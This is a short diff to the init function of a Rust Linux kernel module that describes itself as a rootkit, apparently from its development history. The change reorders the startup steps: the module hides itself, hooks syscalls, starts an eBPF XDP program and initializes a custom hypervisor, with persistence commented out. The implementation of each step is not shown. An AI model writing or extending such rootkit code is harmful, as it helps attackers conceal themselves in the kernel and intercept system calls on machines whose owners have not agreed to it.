@@ -1,5 +1,4 @@
 //! A Linux kernel rootkit in Rust using a custom made type-2 hypervisor and eBPF XDP program.
-//! To-do: complete doc
 
 pub(crate) mod hiding;
 pub(crate) mod hooking;
@@ -23,16 +22,17 @@ struct Blackpill;
 
 impl kernel::Module for Blackpill {
     fn init(module: &'static ThisModule) -> Result<Self> {
-        pr_info!("Starting\n");
-
         // Hide rootkit
         hiding::hide(module);
+
+        // Hook syscalls
+        hooking::syscall::hook_syscalls();
 
         // Make it persistent
         // persistence::persist();
 
-        // Hook syscalls
-        hooking::syscall::hook_syscalls();
+        // Initialize the XDP program
+        xdp::init();
 
         // Initialize the hypervisor
         hypervisor::init();
